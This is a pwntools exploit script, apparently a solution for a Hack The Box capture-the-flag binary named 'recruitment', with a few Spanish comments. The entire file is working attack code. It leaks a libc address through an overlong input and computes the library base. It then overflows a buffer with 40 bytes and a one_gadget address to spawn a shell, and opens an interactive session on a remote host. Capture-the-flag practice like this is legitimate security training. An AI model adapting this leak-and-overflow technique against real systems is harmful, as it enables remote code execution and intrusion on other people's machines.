from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./recruitment")
libc = ELF('./glibc/libc.so.6')

def start():
    if args.REMOTE:
        return remote("94.237.54.129", 38822)
        #return remote("127.0.0.1", 1337)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()


io.sendlineafter("$ ", "1")
io.sendlineafter("[+] Name:  ", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
io.sendlineafter("[+] Class: ", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
# Esta cantidad para leak en mi propio server xD
io.sendlineafter("[+] Age:   ", "BBBBBBB")
# Esta cantidad para leak en remoto de HTB
io.sendlineafter("[+] Age:   ", "BBBBBBBBBBBBBBBBBBBBBBB")

io.recvuntil("[*] Age: ")
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b"\x00"))

print(f"Leak: {hex(leak)}")

libc.address = leak - 605130

print(f"System: {hex(libc.sym.system)}")

rop = ROP(libc)

io.sendlineafter("$ ", "3")

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

print(f"pop rdi: {hex(pop_rdi)}")
print(f"ret: {hex(ret)}")
print(f"binsh: {hex(next(libc.search(b'/bin/sh')))}")

one_gadget = [0x583dc, 0x583e3, 0xef4ce, 0xef52b]

payload = b"".join([
    b"A"*40,
    p64(libc.address + one_gadget[1])
])
input("PAUSE")
io.sendlineafter("We need you to tell us a bit about you so that we can assign to you your first mission: ", payload)

io.interactive()